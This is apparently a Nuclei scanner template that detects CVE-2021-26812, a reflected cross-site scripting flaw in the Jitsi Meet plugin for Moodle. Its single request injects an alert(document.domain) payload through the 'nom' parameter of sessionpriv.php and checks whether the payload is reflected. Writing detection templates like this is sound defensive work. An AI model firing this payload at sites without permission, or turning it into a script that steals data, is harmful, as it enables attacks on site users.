id: CVE-2021-26812

info:
  name: Moodle jitsi plugin XSS
  author: aceseven (digisec360)
  description: Cross Site Scripting (XSS) in the Jitsi Meet 2.7 through 2.8.3 plugin for Moodle via the "sessionpriv.php" module. This allows attackers to craft a malicious URL, which when clicked on by users, can inject javascript code to be run by the application.
  severity: medium
  tags: cve,cve2021,moodle,jitsi,xss
  reference: |
        - https://github.com/udima-university/moodle-mod_jitsi/issues/67
        - https://nvd.nist.gov/vuln/detail/CVE-2021-26812

requests:
  - method: GET
    path:
      - "{{BaseURL}}/mod/jitsi/sessionpriv.php?avatar=https%3A%2F%2F{{Hostname}}%2Fuser%2Fpix.php%2F498%2Ff1.jpg&nom=test_user%27)%3balert(document.domain)%3b//&ses=test_user&t=1"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "alert(document.domain);"

      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "MoodleSession"